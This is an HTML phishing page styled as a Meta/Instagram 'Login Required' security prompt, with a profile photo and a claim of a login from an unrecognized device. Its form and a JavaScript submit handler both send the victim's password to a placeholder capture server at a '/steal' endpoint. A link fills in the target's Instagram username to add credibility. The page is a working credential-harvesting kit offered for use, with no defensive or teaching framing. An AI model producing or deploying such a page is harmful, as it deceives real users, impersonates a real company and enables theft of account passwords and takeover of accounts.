<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Required | Meta</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: white;
            color: #1a1a1a;
            margin: 0;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 400px;
        }
        .logo-container { text-align: center; margin-bottom: 20px; opacity: 0.7; }
        .profile-section { display: flex; align-items: center; gap: 16px; margin-bottom: 24px; }
        .profile-pic { width: 80px; height: 80px; border-radius: 50%; object-fit: cover; border: 2px solid #e0e0e0; }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 12px; color: #000000; }
        p { line-height: 1.5; color: #555555; max-width: 320px; margin: 0 auto; text-align: center; }
        .auth-wrapper {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; outline: none; transition: border-color 0.2s; }
        input[type="password"]:focus { border-color: #0066ff; box-shadow: 0 0 0 2px rgba(0,100,255,0.3); }
        button[type="submit"] {
            width: 100%;
            padding: 14px;
            background-color: #1877ff;
            color: white;
            border: none;
            border-radius: 6px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-container">
            <!-- Meta Logo -->
            <svg width="134" height="42" viewBox="0 0 134 42" fill="none" xmlns="http://www.w3.org/2000" style="opacity: 0.7;">
                <path d="M12.5 2C19.5 24 31 C25.8 C36.7 M12.5" stroke="black" stroke-width="2"/>
            </svg>
        </div>

        <div class="profile-section">
            <img src="photo_2026-10-01_15-48-11.jpg" class="profile-pic">
            <div>
                <h1>Login Required</h1>
                <p>We've detected a login attempt from an unrecognized device. This is you? Enter your password to continue.</p>
            </div>
        </div>

        <form action="https://[CAPTURE_SERVER].com/steal" method="POST">
            <input type="hidden" name="csrf_token" value="stale_token">
            <div class="auth-wrapper">
                <input type="password" name="password" id="password" placeholder="Password" autocomplete="current-password" required>
                <button type="submit">Continue</button>
            </div>
        </form>

        <div style="margin-top: 20px; text-align: center;">
            <a href="#" onclick="window.location.href='https://instagram.com/[THEIR_USERNAME]'" style="color: #0066ff; text-decoration: none; font-size: 14px;">← Back to Instagram</a>
        </div>
    </div>

    <script>
        document.querySelector('form').onsubmit = function(e) {
            e.preventDefault()
            var password = document.getElementById('password').value
            if (!password) return
            fetch('https://[CAPTURE_SERVER].com/steal', {
                method: 'POST',
                body: JSON.stringify({password: password}),
                headers: {'Content-Type': 'application/json'}
            })
        }
    </script>
</body>
</html>
